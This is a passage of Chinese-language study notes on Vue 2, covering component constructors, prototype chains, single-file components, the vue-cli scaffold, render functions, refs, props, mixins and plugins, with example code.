    <div id="root">
        {{msg}}
        <app-component>
            <hello></hello>
            <student-component></student-component>
        </app-component>
    </div>
    <script>
        // 成绩组件
        const GradeComponent = Vue.extend({
            name: 'gradeComponent',
            template: `
                <div>
                    <h2>科目名称：{{name}}</h2>
                    <h2>考试成绩：{{score}}</h2>
                </div>
            `,
            data() {
                return {
                    name: '数据结构',
                    score: 88
                }
            }
        })

        // 学生组件
        const StudentComponent = Vue.extend({
            name: 'studentComponent',
            template: `
                <div>
                    <h2>学生名称：{{name}}</h2>
                    <h2>学生年龄：{{age}}</h2>
                    <grade-component></grade-component>
                </div>
            `,
            data() {
                return {
                    name: '小黄',
                    age: 18
                }
            },
            components: {
                GradeComponent
            }
        })

        // 学校组件
        const SchoolComponent = Vue.extend({
            name: 'schoolComponent',
            template: `
                <div>
                    <h2>学校名称：{{name}}</h2>
                    <h2>学校地址：{{address}}</h2>
                    <student-component></student-component>
                </div>
            `,
            data() {
                return {
                    name: '尚硅谷',
                    address: '广东广州'
                }
            },
            components: {
                StudentComponent
            }
        })

        // 问候组件
        const HelloComponent = Vue.extend({
            name: 'helloComponent',
            template: `
                <h1>Hello, Vue!</h1>
            `
        })

        // App 组件
        const AppComponent = Vue.extend({
            name: 'App',
            template: `
                <div>
                    <h1>学校信息</h1>
                    <hello-component></hello-component>
                    <school-component></school-component>
                </div>
            `,
            components: {
                SchoolComponent,
                HelloComponent
            }
        })

        const vm = new Vue({
            el: '#root',
            data: {
                msg: 'hello~'
            },
            components: {
                AppComponent
            }
        })
    </script>
</body>
</html>
```

#### VueComponent

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://cdn.jsdelivr.net/npm/vue@2.7.16/dist/vue.js"></script>
    <title>Document</title>
</head>
<body>
    <div id="root">
        <!-- {{msg}} -->
        <School></School>
        <hello></hello>
    </div>
    <script>
        // 学校组件
        const School = Vue.extend({
            template: `
                <div>
                    <h2>学校名称：{{name}}</h2>
                    <h2>学校地址：{{address}}</h2>
                    <button @click="show">点我提示学校名称</button>
                </div>
            `,
            data() {
                return {
                    name: '尚硅谷',
                    address: '广东广州'
                }
            },
            methods: {
                show(){
                    console.log(this);
                    // VueComponent:[object Object]
                    alert(this.name)
                }
            },
        })

        // 问候组件
        const hello = Vue.extend({
            template: `
                <div>
                    <h2>{{text}}</h2>
                </div>
            `,
            data() {
                return {
                    text:'你好'
                }
            },
        })

        console.log('@',School);
        console.log('@',hello);
        /* 组件的本质是一个构造函数
            @ ƒ VueComponent(options) {
                this._init(options);
            }
         */
        console.log(School===hello);//false
        
        
        const vm = new Vue({
            el: '#root',
            data: {
                // msg: 'hello~'
            },
            components: {
                School,
                hello
            }
        })
        console.log(vm);
        /*
            $children: Array(2): 
            0: VueComponent {_uid: 1, _isVue: true, __v_skip: true, _scope: EffectScope, $options: {…}, …}
            1: VueComponent {_uid: 2, _isVue: true, __v_skip: true, _scope: EffectScope, $options: {…}, …}
            length: 2
            [[Prototype]]: Array(0) 
         */
    </script>
</body>
</html>
```

1. school组件本质是一个名为`Vuecomponent`的构造函数，且不是程序员定义的，是`Vue.extend`生成的。
    
2. 我们只需要写`<school/>`或`<school></school>`，Vue解析时会帮我们创建school组件的实例对象,即Vue帮我们执行的:`new VueComponent(options)`
    
    - 理解：
    
    通过搜索找到`Vue.extend`的源码：
    
    > `Vue.extend` 是一个静态方法，用于创建一个新的组件构造器。每次调用 `Vue.extend` 都会返回一个新的 `VueComponent` 函数。
    > 
    > 这意味着每次创建组件时，都是基于原始组件构造器的全新实例，它们具有不同的引用。
    
    ```js
    Vue.extend = function (extendOptions) {
              extendOptions = extendOptions || {};
              var Super = this;
              var SuperId = Super.cid;
              var cachedCtors = extendOptions._Ctor || (extendOptions._Ctor = {});
              if (cachedCtors[SuperId]) {
                  return cachedCtors[SuperId];
              }
              var name = getComponentName(extendOptions) || getComponentName(Super.options);
              if (name) {
                  validateComponentName(name);
              }
              var Sub = function VueComponent(options) {
                  this._init(options);
              };
              Sub.prototype = Object.create(Super.prototype);
              Sub.prototype.constructor = Sub;
              Sub.cid = cid++;
              Sub.options = mergeOptions(Super.options, extendOptions);
              Sub['super'] = Super;
              // For props and computed properties, we define the proxy getters on
              // the Vue instances at extension time, on the extended prototype. This
              // avoids Object.defineProperty calls for each instance created.
              if (Sub.options.props) {
                  initProps(Sub);
              }
              if (Sub.options.computed) {
                  initComputed(Sub);
              }
              // allow further extension/mixin/plugin usage
              Sub.extend = Super.extend;
              Sub.mixin = Super.mixin;
              Sub.use = Super.use;
              // create asset registers, so extended classes
              // can have their private assets too.
              ASSET_TYPES.forEach(function (type) {
                  Sub[type] = Super[type];
              });
              // enable recursive self-lookup
              if (name) {
                  Sub.options.components[name] = Sub;
              }
              // keep a reference to the super options at extension time.
              // later at instantiation we can check if Super's options have
              // been updated.
              Sub.superOptions = Super.options;
              Sub.extendOptions = extendOptions;
              Sub.sealedOptions = extend({}, Sub.options);
              // cache constructor
              cachedCtors[SuperId] = Sub;
              return Sub;
          };
      }
    ```
    
    取部分：
    
    ```js
    Vue.extend = function (extendOptions) {
              ……
              var Sub = function VueComponent(options) {
                  //console.log('VueComponent被调用了')
                  this._init(options);
              };
              ……
              return Sub;
          };
      }
    ```
    
    > 在 `Vue.extend` 函数内部，首先定义了一个名为 `VueComponent` 的函数，该函数是继承自原始组件构造器的。然后，它创建了一个新的原型链，将原始组件构造器的原型链作为基础，并添加了自己的原型链。这样，新的组件构造器就继承了原始组件构造器的属性和方法，并且可以通过 `Sub.prototype = Object.create(Super.prototype);` 访问到这些属性和方法。
    > 
    > 最后，`Vue.extend` 函数返回了新的组件构造器 `Sub`。每次调用 `Vue.extend` 都会创建一个新的组件构造器实例，因此返回的 `Sub` 函数都是全新的。
    
3. **特别注意：每次调用Vue.extend，返回的都是一个全新的`VueComponent`!!!**
    
4. 关于this指向:
    
    - (1).组件配置中:
        - data函数、methods中的函数、watch中的函数、computed中的函数
        - 它们的this均是【Vuecomponent实例对象】
    - (2).new Vue()配置中:
        - data函数、methods中的函数、watch中的函数、computed中的函数
        - 它们的this均是【vue实例对象vm】
5. `VueComponent`的实例对象，以后简称`vc` (也可称之为:组件实例对象)
    
    `Vue`的实例对象，以后简称`vm`
    

new Vue/定义组件传入的配置对象的配置项顺序是没有要求的，通常顺序是template、data、components …

#### 一个重要的内置关系

原型基础知识

```html
<script type="text/javascript">
	// 定义一个构造函数Demo
	function Demo(){
		this.a = 1
		this.b = 2
	}
	
	// 创建一个Demo的实例对象
	const d = new Demo()
	
	// 只要是函数，身上就有一个prototype属性，显式原型属性
	consle.log(Demo.prototype)

	// 构造函数缔造出来的实例对象，身上有一个__proto__属性，隐式原型属性
	console.log(d.__proto__)

	// 显式原型属性和隐式原型属性指向了同一个原型对象
	console.log(Demo.prototype === d.__proto__)

	// 程序员通过显式原型属性操作原型对象，追加了一个x属性，值为99
	Demo.prototype.x = 99

	// 可以通过隐式原型对象拿到刚刚追加的属性
	console.log(d.__proto__.x)
	
	// 这样也可以拿到，d身上没有x，默认就会从__proto__找x【自身没有，就按照隐式原型链查找】
	console.log(d.x)
</script>
```

- 查看Vue构造函数身上的属性和方法 `console.dir(Vue)`
- Vue原型对象的所有属性和方法，Vue的实例对象都能用
- 只要是函数，身上就有`prototype`属性
- 只要是对象，身上就有`__proto__`属性
- 实例的隐式原型属性永远指向自己缔造者【实例的构造函数】的原型对象

![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/a782755f692f105ffb7635d10548a04b.png#pic_center)

1. 一个重要的内置关系：`VueComponent.prototype.__ proto__ === Vue.prototype`  
    Vue让VueComponent原型对象的隐式原型属性指向了Vue的原型对象，也就是说，VueComponent原型对象的原型对象就是Vue的原型对象
    
2. 为什么要有这个关系：让组件实例对象（vc）可以访问到 Vue原型上的属性、方法。
    

![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/0b57601c3f1499e2f299bc3448e162e6.png#pic_center)  
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/f4905f9c5631503fe072c97b6e670348.png#pic_center)  
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/769ebaba020782a94f76a93412e40053.png#pic_center)

谁缔造了这个原型对象，就是看看这个原型对象是什么类型的

### 2.3. 单文件组件

一个文件中只包含1个组件，文件和组件是一一对应的

#### 2.3.1. 一个.vue 文件的组成(3 个部分)

**安装VsCode插件**

VScode对Vue编码提供支持的插件，推荐使用【名称：`vetur`，作者：Pine Wu】

注：安装后要重启VScode才能生效

- 一个标准组件的构成：html + css + js
- 相对应的，Vue提供了三个标签，`<template></template>`、`<style></style>`、`<script></script>`，分别负责编写组件的结构、组件的样式、组件交互相关的代码（数据、方法等等）

|标准组件构成|Vue 对应标签|说明|
|---|---|---|
|HTML 结构|`<template>`|用于编写组件的结构，即组件的模板|
|CSS 样式|`<style>`|用于编写组件的样式，可以包含 `<style>` 标签内的样式代码或外链的 CSS 文件|
|JavaScript 逻辑|`<script>`|用于编写组件交互相关的代码，如数据、方法、生命周期钩子等|

##### 1. 模板页面

```vue
<template>
页面模板
</template>
```

> 要求`<template></template>`中必须要有一个根元素

##### 2. JS 模块对象

```vue
<script> 
    export default {
        data() {
            return {}
        }, 
        methods: {},
        computed: {}, 
        components: {}
    }
</script>
```

###### ES6模块化 暴露方式

- **分别暴露**：export，常用于暴露多个对象
    
    暴露：
    
    ```js
    // main.js
    export const x = {
    	methods:{
    		showName(){
    			alert(this.name)
    		}
    	}
    }
    ```
    
    引入：
    
    ```js
    import { x } from './mian.js'
    ```
    
- **统一暴露**：export {}
    
- **默认暴露**：export default，最常用，默认暴露单个对象的情况下引入的方式最简单
    
    暴露：
    
    ```js
    export default {
    	name: 'School',
    	data(){
    		return {
    			name: '尚硅谷',
    			address: '北京'
    		}
    	}
    }
    ```
    
    引入：
    
    ```js
    import School from './School'
    //后缀名.vue可省略
    ```
    

> 1. name属性最好与文件名保持一致，如果不写，默认组件名为注册时指定的名字
> 2. **入口文件 main.js**在不同的脚手架中命名可能不同，main/index/app.js

##### 3. 样式

```vue
<style>
样式定义
</style>
```

#### 2.3.2. 基本使用

1. 引入组件
    
2. 映射成标签
    
3. 使用组件标签
    

##### 案例全过程：

1. 创建School组件和Student组件
    
    ```vue
    <template>
        <!-- 组件的结构 -->
        <div class="demo">
            <h2>学校名称：{{name}}</h2>
            <h2>学校地址：{{address}}</h2>
            <button @click="show">点我提示学校名称</button>
        </div>
    </template>
    
    <script>
    // 组件交互相关的代码（数据，方法等）
        // 1. 分别暴露 
        // export const school=Vue.extend({
        // const school=Vue.extend({
        //     data() {
        //         return {
        //             name: '尚硅谷',
        //             address: '广东广州'
        //         }
        //     },
        //     methods: {
        //         show(){
        //             console.log(this)
        //             alert(this.name)
        //         }
        //     },
        // })
        // 2. 统一暴露
        // export {school}
        // 3. 默认暴露（暴露的只有一个）加在定义前面也行
        // export default school
        
        // 最简写法
        export default {
            name:'School',//与文件名相同
            data() {
                return {
                    name: '尚硅谷',
                    address: '广东广州'
                }
            },
            methods: {
                show(){
                    console.log(this)
                    alert(this.name)
                }
            },
        }
    </script>
    
    <style>
        /* 组件的样式 */
        .demo {
            background-color: pink;
        }
    </style>
    ```
    
    ```vue
    <template>
        <!-- 组件的结构 -->
        <div class="student">
            <h2>学生名称：{{studentName}}</h2>
            <h2>学生年龄：{{studentAge}}</h2>
            <button @click="show">点我提示学生名称</button>
        </div>
    </template>
    
    <script>
        export default {
            name: 'Student',
            data() {
                return {
                    studentName: '小黄',
                    studentAge: 18
                }
            },
            methods: {
                show(){
                    console.log(this)
                    alert(this.studentName)
                }
            },
        }
    </script>
    <!-- 没有样式可以直接删除该标签 -->
    <!-- <style>
        /* 组件的样式 */
    </style> -->
    ```
    
2. 创建App.vue，用于汇总所有组件
    
    ```vue
    <template>
      <div>
        <School></School>
        <Student></Student>
      </div>
    </template>
    
    <script>
    import School from './School.vue';
    import Student from './Student.vue';
        export default {
            name:'App',
            components:{
                School,
                Student
            }
        }
    </script>
    
    <style>
    </style>
    ```
    
3. 创建main.js入口文件，用于创建Vue实例并指明要服务的容器`#root`
    
    ```js
    import App from "./App.vue"
    
    new Vue({
        el:'#root',
        template:`<App></App>`,
        components:{
            App
        }
    })
    ```
    
4. 创建index.html，包含了容器
    

````
```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>练习一下单文件组件的语法</title>
</head>
<body>
    <!-- 容器 -->
    <div id="#root"></div>
		<!-- 注意书写顺序 -->
    <script src="./App.vue"></script>
    <script src="./main.js"></script>
</body>
</html>
```
````

---

注意：直接运行是会报错，浏览器不能直接支持ES6的模块化语法

```js
Uncaught SyntaxError: Cannot use import statement outside a module
```

两种解决方法：

1. **使用 Webpack**：
    - **简介**：Webpack 是一个现代 JavaScript 应用程序的静态模块打包器（module bundler）。当 Webpack 处理应用程序时，它会递归地构建一个依赖关系图（dependency graph），其中包含应用程序需要的每个模块，然后将所有这些模块打包成一个或多个 `bundle` 文件
    - **优点**：Webpack 非常灵活，允许开发者通过配置 Loader 和 Plugin 来定制打包过程，支持各种构建场景
    - **缺点**：Webpack 的配置相对复杂，需要开发者具备一定的 Node.js 和 JavaScript 知识
2. **使用 Vue 官方提供的脚手架**：
    - **简介**：Vue 官方提供了一个名为 `vue-cli` 的脚手架工具，它使用 Webpack 构建了一个开箱即用的开发环境和工作流
    - **优点**：Vue 脚手架提供了丰富的默认配置，可以快速上手，适合初学者。同时，它也支持高级配置，允许开发者根据需要进行定制
    - **缺点**：相比手动配置 Webpack，Vue 脚手架的定制能力可能不如直接使用 Webpack 灵活

## 第 3 章：使用 Vue 脚手架

`vue-cli` （cli — **C**ommand **L**ine **I**nterface 命令行脚手架工具）的脚手架工具

### 3.1 初始化脚手架

#### 3.1.1 说明

1. Vue 脚手架是Vue 官方提供的标准化开发工具（开发平台）
    
2. 最新的版本是 5.x（根据当下情况）
    
3. 文档: https://cli.vuejs.org/zh/
    

#### 3.1.2 具体步骤

第一步（仅第一次执行）：全局安装@vue/cli

```cmd
npm install -g @vue/cli
```

第二步：**切换到你要创建项目的目录**，然后使用命令创建项目

```cmd
vue create xxxx
```

第三步：启动项目

```
npm run serve
```

备注：

1. 如出现下载缓慢请设置淘宝镜像:

```cmd
npm config set registry https://registry.npm.taobao.org
```

> 淘宝新镜像地址：http://registry.npmmirror.com

2. Vue 脚手架隐藏了所有webpack 相关的配置，若想查看具体的webpakc 配置，请执行：

```cmd
vue inspect > output.js
```

> 运行后 网页报错：【待解决】
> 
> 1. WebSocket connection to ‘ws://10.205.21.78:8080/ws’ failed: Error in connection establishment: net::ERR_CONNECTION_TIMED_OUT
>     
> 2. TypeError: Cannot set properties of null (setting ‘exmid’)
>     
> 3. Component name “XXX” should always be multi-word
>     
>     > - 单个单词的组件名（文件以及定义）都要改成小写开头
>     >     
>     > - 在`vue.config.js 文件`中加代码【不太推荐】
>     >     
>     >     ```js
>     >     // 关闭eslint校验
>     >     lintOnSave: false 
>     >     ```
>     >     
>     > - 在.eslintrc.js 文件在 rules 里面加上（建的项目没有.eslintrc.js的话，rules在package.json中）
>     >     
>     >     ```js
>     >     // 关闭名称校验
>     >     "vue/multi-word-component-names": "off"
>     >     ```
>     >     
>     > - 注意：（重启项目，配置文件才生效）
>     >     
>     

#### **3.1.3** **模板项目的结构**

![外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传](https://i-blog.csdnimg.cn/blog_migrate/355ad99205deea625bd9f59becb31e41.png)

```text
├── node_modules
├── public
│   ├── favicon.ico: 页签图标
│   └── index.html: 主页面
├── src
│   ├── assets: 存放静态资源
│   │   └── logo.png
│   │── component: 存放组件
│   │   └── HelloWorld.vue
│   │── App.vue: 汇总所有组件
│   │── main.js: 入口文件
├── .gitignore: git版本管制忽略的配置
├── babel.config.js: babel的配置文件
├── package.json: 应用包配置文件
├── README.md: 应用描述文件
├── package-lock.json：包版本控制文件
```

index.html 主页面讲解：

```html
<!DOCTYPE html>
<html lang="">
  <head>
    <meta charset="utf-8">
    <!-- 针对IE浏览器的一个特殊配置，含义是让IE浏览器以最高的渲染级别渲染页面 -->
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <!-- 开启移动端的理想视口 -->
    <meta name="viewport" content="width=device-width,initial-scale=1.0">
    <!-- 配置页签图标 -->
    <!-- <%= BASE_URL %>是基于 -->
    <link rel="icon" href="<%= BASE_URL %>favicon.ico">
    <!-- 配置网页标题 -->
    <title><%= htmlWebpackPlugin.options.title %></title>
  </head>
  <body>
    <!-- 当浏览器不支持js时noscript中的元素就会被渲染 -->
    <noscript>
      <strong>We're sorry but <%= htmlWebpackPlugin.options.title %> doesn't work properly without JavaScript enabled. Please enable it to continue.</strong>
    </noscript>
    
    <!-- 容器 -->
    <div id="app"></div>
    <!-- built files will be auto injected -->
  </body>
</html>
```

##### Vue 脚手架项目的运行流程：

1. **启动开发服务器**：
    - 打开命令行工具，导航到 Vue 项目的根目录
    - 执行 `npm run serve` 命令来启动开发服务器，编译项目并启动一个本地服务器，允许通过 `http://localhost:8080` 访问应用程序
2. **编辑 `src/main.js` 入口文件**：
    - `src/main.js` 是 Vue 应用的入口文件，它定义了应用的初始设置
    - 在这个文件中，引入 `App.vue` 作为 Vue 应用的根组件
3. **编辑 `src/App.vue` 根组件**：
    - `App.vue` 是 Vue 应用的根组件，它定义了应用的布局和结构
    - 在这个组件中，会导入并使用其他组件，如 `Header.vue`、`Footer.vue` 等，并将其放置在 `App.vue` 的模板中
4. **在 `src/main.js` 中组装组件**：
    - 在 `src/main.js` 中，将 `App.vue` 组件放入一个容器元素，通常是 `#app` 元素，作为整个应用的根节点
5. **编辑 `src/index.html` 模板**：
    - `src/index.html` 是 Vue 项目的 HTML 入口文件，它定义了页面的基本结构
    - 在这个文件中，引入 `main.js` 作为 JavaScript 脚本，并设置一个容器元素，如 `<div id="app"></div>`，用于挂载 Vue 应用

##### main.js代码讲解–render 函数

创建实例对象部分：

```js
//原脚手架创建
    // 创建vue实例对象
    new Vue({
      // 完成功能: 将App组件放入容器中
      render: h => h(App),
    }).$mount('#app')//可以换成 el:'#app'

//修改进行测试
	new Vue({
    	el:'#app',
        template:`<App></App>`
      	components:{App},
    })
```

- 报错提示：
    
    - 报错：[vue warn]: You are using the runtime-only build of vue where the template compiler is not available, either pre-compile the templates into render functions,or use the compiler-included build.
    - 翻译：你使用的是 vue 的纯运行时构建，模板编译器不可用，要么将模板预编译成渲染函数，要么使用编译器包含的构建。
- 使用了 Vue 的运行时版本（runtime-only）残缺，而不是完整版本（runtime + compiler），这意味着 Vue 的**模板编译器**不可用
    
- 尝试
    
    ```js
    new Vue({
        el:'#App',
        template:`<h1>你好啊</h1>`
    }
    ```
    

````
```js
new Vue({
    el:'#App',
    render(createElement){
        return createElement('h1','你好啊')
    }
})
//官方说法是： createElement 是一个函数
//精简： 改成箭头函数-->箭头函数简化-->名称替换简化
new Vue({
    el:'#App',
    /*1.0
    render(createElement){
        return createElement('h1','你好啊')
    },
    */
    //2.0 render:createElement=>return createElement('h1','你好啊'),
    render:h=>h('h1','你好啊'),
})
```
````

关于不同版本的Vue:

1. vue.js与vue.runtime.xxx.js的区例:
    
    - (1).vue.js是完整版的Vue，包含:核心功能+模板解析器。
    - (2).vue.runtime.xxx.js是运行版的Vue，只包含:核心功能;没有板解析器
2. 因为vue.runtime.xxx.js没有模板解析器，所以不能使用template配置项，需要使用render函数接收到的createElement所数去指定具体内容
    

##### 修改默认配置

查看webpack 相关配置`vue inspect > output.js`

> 仅仅是输出让你看的文件 在这里更改是无效的

快捷键：Ctrl + F 打开搜索栏

- 进行自行配置

[配置参考 | Vue CLI (vuejs.org)](https://cli.vuejs.org/zh/config/?spm=a2c6h.12873639.article-detail.10.4aca12absvAYxG)

在 package.json 同级目录下创建 **`vue.config.js`**

```js
// Commonjs 的暴露
// node.js 使用的 commonjs的暴露 不能用ES6
module.exports = {
  pages: {
    index: {
      // page 的入口
      entry: 'src/index/main.js',
      // 模板来源
      template: 'public/index.html',
      // 在 dist/index.html 的输出
      filename: 'index.html',
      // 当使用 title 选项时，
      // template 中的 title 标签需要是 <title><%= htmlWebpackPlugin.options.title %></title>
      title: 'Index Page',
      // 在这个页面中包含的块，默认情况下会包含
      // 提取出来的通用 chunk 和 vendor chunk。
      chunks: ['chunk-vendors', 'chunk-common', 'index']
    },
    // 当使用只有入口的字符串格式时，
    // 模板会被推导为 `public/subpage.html`
    // 并且如果找不到的话，就回退到 `public/index.html`。
    // 输出文件名会被推导为 `subpage.html`。
    subpage: 'src/subpage/main.js'
  }
}
```

关闭语法检查

```js
lintOnSave:false //与page平级
```

### 3.2 ref 与 props

#### 一、**ref**

1. 被用来给元素或**子组件**注册引用信息（id的替代者）
2. 应用在html标签上获取的是真实DOM元素，应用在组件标签上是组件实例对象（vc）
3. 使用方式：
    1. 打标识：`<h1 ref="xxx">.....</h1>`或 `<School ref="xxx"></School>`
    2. 获取：`this.$refs.xxx`

App.vue：

```vue
<template>
  <div id="app">
    <h1 v-text="msg" ref="title"></h1>
    <button @click="showDom()">点我输出上面的DOM元素</button>
    <!-- 脚手架可以使用自闭合样式 -->
    <Student></Student>
    <hr>
    <Student ref="stu"/>
  </div>
</template>

<script>
// 引入组件
import Student from './components/Student.vue';

export default {
  name: 'App',
  data(){
    return {
      msg:'欢迎学习vue'
    }
  },
  // 注册组件
  components: {
    Student
  },
  methods:{
    showDom(){
      console.log(this);
      console.log(this.$refs);//title:h1 + Object【真实的DOM元素】
      // 给谁添加ref属性，vc就收集哪个元素
      console.log(this.$refs.title);//<h1>欢迎学习vue</h1>
      alert(this.$refs.title.innerHTML)
      // =========================================================
      // 注意：给组件添加ref属性，得到Vuecomponent实例
      console.log(this.$refs.stu);
      console.log(this.$refs.stu._data);
      console.log(this.$refs.stu._data.studentName);//小黄
      console.log(this.$refs.stu._data.studentAge);//18
      // =========================================================
      console.log(document.querySelector('.student'))
      /* 跑到组件的根节点，找出对应的完整组件结构
        <div class="student" id="stu">
          <h2>学生名称：小黄</h2>
          <h2>学生年龄：18</h2>
          <button>点我提示学生名称</button>
        </div> 
       */
    }
  }
}
</script>

<style>
#app {
  font-family: Avenir, Helvetica, Arial, sans-serif;
  -webkit-font-smoothing: antialiased;
  -moz-osx-font-smoothing: grayscale;
  text-align: center;
  color: #2c3e50;
  margin-top: 60px;
}
</style>
```

#### 二、props

1. 功能：让组件接收外部传过来的数据
    
2. 传递数据：`<Demo name="xxx"/>`
    
3. 接收数据：
    
    1. 第一种方式（只接收）：`props:['name']`
        
    2. 第二种方式（限制类型）：`props:{name:String}`
        
    3. 第三种方式（限制类型、限制必要性、指定默认值）：
        
        ```js
        props:{
             name:{
                 type:String, //类型
                 required:true, //必要性
                 default:'小黄' //默认值
             }
        }
        ```
        

> 备注：**props是只读的**，Vue底层会监测你对props的修改，如果进行了修改，就会发出警告，若业务需求确实需要修改，那么请**复制**props的内容到data中一份，然后去**修改**data中的数据。

案例演示：

Student.vue

```vue
<template>
    <!-- 组件的结构 -->
    <div class="student">
        <h1>{{ msg }}</h1>
        <h2>学生名称：{{studentName}}</h2>
        <!-- <h2>学生年龄：{{studentAge}}</h2> -->
        <h2>学生年龄：{{MyAge}}</h2>
        <!-- <h2>学生明年年龄：{{+studentAge+1}}</h2> -->
        <!-- <h2>学生明年年龄：{{studentAge+1}}</h2> -->
        <h2>学生明年年龄：{{MyAge+1}}</h2>
        <button @click="show">点我提示学生名称</button>
        <!-- 无法直接修改studentAge，会报错 -->
        <button @click="updateAge">点我修改学生年龄</button>
    </div>
</template>

<script>
    export default {
        name: 'Student',
        data() {
            return {
                msg:'我是一个正在学vue的学生',
                // studentName: '小黄',
                // studentAge: 18

                // 优先级：props传来的>内部设置
                MyAge:this.studentAge
            }
        },
        // 接受的数据要加上''
        props:['studentName','studentAge'],//1. 简单接收
        // 2. 接收的同时对数据进行类型限制
        // props:{
        //     studentName:String,
        //     studentAge:Number
        // },
        // 3. 完整写法  进行类型限制+默认值的指定+必要性的限制
        // props:{
        //     studentName:{
        //         typeof:String,//类型
        //         required:true //必要
        //     },
        //     studentAge:{
        //         typeof:Number,
        //         default:999//不是必要值，如果没传就给默认
        //     }
        // },
        methods: {
            show(){
                console.log(this)
                alert(this.studentName)
            },
            updateAge(){
                console.log('点击');
                this.MyAge++
            }
        },
    }
</script>
```

App.vue

```vue
<template>
  <div id="app">
    <!-- <Student studentName="废废" studentAge="20"/> -->
    <!-- <Student studentName="小黄" studentAge="18"/> -->
    <!-- 不加引号传递字符串 加上引号变成属性，传递表达式 -->
    <Student studentName="笨笨" :studentAge=17 />
    <!-- <Student studentName="小刘鸭" /> -->
  </div>
</template>

<script>
// 引入组件
import Student from './components/Student.vue';

export default {
  name: 'App',
  data(){
    return {
      msg:'欢迎学习vue'
    }
  },
  // 注册组件
  components: {
    Student
  },
}
</script>
```

### 3.3 混入 – mixin

1. 功能：可以把多个组件共用的配置提取成一个混入对象
    
2. 使用方式：
    

- 第一步：定义混合
    
    ```js
    {
        data(){....},
        methods:{....}
    }
    ```
    
- 第二步：使用混入
    
    - 全局混入：`Vue.mixin(xxx)`
    - 局部混入：`mixins:['xxx']`

**例如：**

1. mixin.js文件 （提取点击事件 展示name属性）
    
    ```js
    //分别暴露
        export const mixin={
            methods: {
                show(){
                    alert(this.name)
                },
            },
            mounted(){
                console.log('你好');//调用多次
            }
        }
        export const hunhe={
            data(){
                return {
                    x:100,
                    y:200
                }
            }
        }
    // 相当于公共的方法，提高复用
    ```
    
2. 在各个组件中（局部）
    
    ```js
    //导入(可以多个)
    import {mixin,hunhe} from '../mixin'
    ……
    //使用(可以多个)，与name,data,methods等同级
    mixins:[mixin,hunhe]
    ```
    
3. 在main.js中（全局）
    
    ```js
    import {mixin,hunhe} from '@/mixin'
    Vue.mixin(mixin)
    Vue.mixin(hunhe)
    ```
    

注意：

```vue
<template>
  <!-- 组件的结构 -->
  <div class="student">
    <h1>{{ msg }}</h1>
    <h2>学生名称：{{ name }}</h2>
    <h2>学生年龄：{{ age }}</h2>
    <button @click="show">点我提示学生姓名</button>
  </div>
</template>

<script>
import {mixin,hunhe} from '@/mixin'
export default {
  name: "Student",
  data() {
    return {
      msg: "我是一个正在学vue的学生",
      name: "小黄",
      age: 18,
      x:888
    //   1. 与混合冲突，以组件本身为主
    }
  },
  // methods: {
  //     show(){
  //         console.log(this)
  //         alert(this.name)
  //     },
  // },
  mixins:[mixin,hunhe],
//   // 特：生命周期钩子不存在冲突，两者都要
  mounted(){// 输出在后
    console.log('你好a!');
  }
};
</script>
```

1. 混入对象可以包含 `data`、`methods`、`computed`、`watch`、`lifeCycle` 等选项
    
2. 如果有冲突，组件的选项会**覆盖**混入的选项【**以组件优先**】（绝大情况下）
    
3. 特殊：混入中的**生命周期钩子**与组件中的生命周期钩子**不会冲突**，它们**都会被调用**
    
    > 你好
    > 
    > 你好a!
    

### 3.4 插件 – plugin

2. 功能：用于增强Vue
    
3. 本质：包含install方法的一个对象，install的第一个参数是Vue，第二个以后的参数是插件使用者传递的数据。
    
4. 定义插件：
    
    ```js
    对象.install = function (Vue, options) {
        // 1. 添加全局过滤器
        Vue.filter(....)
    
        // 2. 添加全局指令
        Vue.directive(....)
    
        // 3. 配置全局混入(合)
        Vue.mixin(....)
    
        // 4. 添加实例方法
        Vue.prototype.$myMethod = function () {...}
        Vue.prototype.$myProperty = xxxx
    }
    ```
    
5. 使用插件：`Vue.use()`
    

样例：

- plugin.js：
    
    ```js
    // 插件是个对象，但要包括install函数
    export default {
    	install(Vue,x,y,z){
    		console.log(x,y,z)
    		//全局过滤器
    		Vue.filter('mySlice',function(value){
    			return value.slice(0,4)
    		})
    
    		//定义全局指令
    		Vue.directive('fbind',{
    			//指令与元素成功绑定时（一上来）
    			bind(element,binding){
    				element.value = binding.value
    			},
    			//指令所在元素被插入页面时
    			inserted(element){
    				element.focus()
    			},
    			//指令所在的模板被重新解析时
    			update(element,binding){
    				element.value = binding.value
    			}
    		})
    
    		//定义混入
    		Vue.mixin({
    			data() {
    				return {
    					x:100,
    					y:200
    				}
    			},
    		})
    
    		//给Vue原型上添加一个方法（vm和vc就都能用了）
    		Vue.prototype.hello = ()=>{
                alert('你好啊')
            }
    	}
    }
    ```
    
- mian.js：
    
    ```js
    // 引入并应用插件
    import plugin from './plugin'
    Vue.use(plugin,1,2,3)//允许传参
    ```
    
- Student.vue：
    
    ```vue
    <template>
      <!-- 组件的结构 -->
      <div class="student">
        <h1>{{ msg }}</h1>
        <h2>学生名称：{{ name }}</h2>
        <h2>学生年龄：{{ age }}</h2>
        <button @click="show">点我提示学生姓名</button>
        <input type="text" v-fbind:value="name">
      </div>
    </template>
    
    <script>
    export default {
      name: "Student",
      data() {
        return {
          msg: "我是一个正在学vue的学生",
          name: "小黄",
          age: 18,
        }
      },
      methods: {
        show() {
          console.log(this);
          alert(this.name);
        },
      },
    };
    </script>
    ```
    
- School.vue：
    
    ```vue
    <template>
      <!-- 组件的结构 -->
      <div class="demo">
                      <!-- 使用过滤器 -->
        <h2>学校名称：{{ name | mySlice }}</h2>
        <h2>学校地址：{{ address }}</h2>
        <button @click="show">点我提示学校名称</button>
        <button @click="test">点我进行测试</button>
      </div>
    </template>
    
    <script>
    export default {
      name: "School", 
      data() {
        return {
          // name: "尚硅谷",
          name: "尚硅谷B站大学",//过滤器只取前四个字符
          address: "广东广州",
        };
      },
      methods: {
        show() {
          console.log(this);
          alert(this.name);
        },
        test(){
          this.hello()
        }
      },
    };
    </script>
    ```
    

